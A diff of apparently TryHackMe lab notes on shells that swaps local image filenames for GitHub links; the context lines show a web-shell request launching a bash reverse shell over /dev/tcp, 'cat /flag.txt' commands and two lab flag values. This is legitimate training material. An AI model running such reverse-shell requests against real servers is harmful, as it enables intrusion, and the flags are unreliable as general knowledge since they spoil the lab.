@@ -454,7 +454,7 @@ ls /
 cat /flag.txt
 ```
 
-![Flag found via cat /flag.txt — THM{...}](shell_task_5.png)
+![Flag found via cat /flag.txt — THM{...}](https://github.com/alimirza2412/Tryhackme-notes/blob/4799e00355135c47be1bfa1ccc9cb2a7c1e0faad/Cyber-Security-101/Offensive-Security-Tooling/Shell-Overview/shell%20task%205.png)
 
 ```
 THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}
@@ -514,7 +514,7 @@ http://10.114.157.52:8082/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/1
 
 **Step 7 — Shell Received on Attacker Terminal**
 
-![Web shell reverse shell connection received - www-data prompt](shell_task3.png)
+![Web shell reverse shell connection received - www-data prompt](https://github.com/alimirza2412/Tryhackme-notes/blob/4799e00355135c47be1bfa1ccc9cb2a7c1e0faad/Cyber-Security-101/Offensive-Security-Tooling/Shell-Overview/shell%20task3.png)
 
 ```
 Connection received on 10.114.157.52 XXXXX ✅
@@ -528,7 +528,7 @@ ls /
 cat /flag.txt
 ```
 
-![Flag found via cat /flag.txt — THM{...}](shell_task_4.png)
+![Flag found via cat /flag.txt — THM{...}](https://github.com/alimirza2412/Tryhackme-notes/blob/4799e00355135c47be1bfa1ccc9cb2a7c1e0faad/Cyber-Security-101/Offensive-Security-Tooling/Shell-Overview/shell%20task%204.png)
 
 ```
 THM{202bb14ed12120b31300cfbbbdd35998786b44e5}
